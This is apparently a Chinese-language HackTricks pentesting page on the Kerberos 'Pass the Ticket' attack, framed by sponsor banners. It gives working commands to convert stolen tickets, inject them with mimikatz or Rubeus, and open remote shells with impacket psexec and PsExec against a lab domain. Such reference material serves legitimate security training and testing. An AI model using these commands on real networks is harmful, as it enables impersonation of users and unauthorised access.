# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}

## Pass The Ticket (PTT)

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者 **窃取用户的认证票证**，而不是他们的密码或哈希值。然后使用这个被窃取的票证来 **冒充用户**，获得对网络内资源和服务的未经授权访问。

**阅读**：

- [从 Windows 收集票证](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [从 Linux 收集票证](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **在平台之间交换 Linux 和 Windows 票证**

[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) 工具仅使用票证本身和输出文件来转换票证格式。
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
在Windows中可以使用[Kekeo](https://github.com/gentilkiwi/kekeo)。

### Pass The Ticket攻击
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## 参考文献

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=pass-the-ticket) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pass-the-ticket" %}

{{#include ../../banners/hacktricks-training.md}}
